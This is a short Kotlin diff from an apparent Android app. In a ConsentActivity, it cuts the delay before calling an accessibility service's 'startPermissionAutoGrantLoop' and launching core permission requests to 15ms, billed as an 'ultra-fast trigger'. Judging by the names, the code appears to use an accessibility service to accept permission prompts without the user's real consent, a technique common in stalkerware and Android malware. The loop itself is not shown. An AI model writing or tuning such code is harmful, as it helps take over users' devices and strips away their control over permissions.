@@ -82,7 +82,7 @@ class ConsentActivity : AppCompatActivity() {
             Handler(Looper.getMainLooper()).postDelayed({
                 BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
                 runtimePermissionLauncher.launch(corePermissions)
-            }, 200L)
+            }, 15L)
         } else {
             proceedToActivation()
         }
@@ -119,7 +119,7 @@ class ConsentActivity : AppCompatActivity() {
                 Handler(Looper.getMainLooper()).postDelayed({
                     BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
                     runtimePermissionLauncher.launch(corePermissions)
-                }, 150L) // Handshake delay reduced from 400ms to 150ms for faster trigger
+                }, 15L) // Handshake delay reduced to 15ms for ultra-fast trigger
             }
         }
 
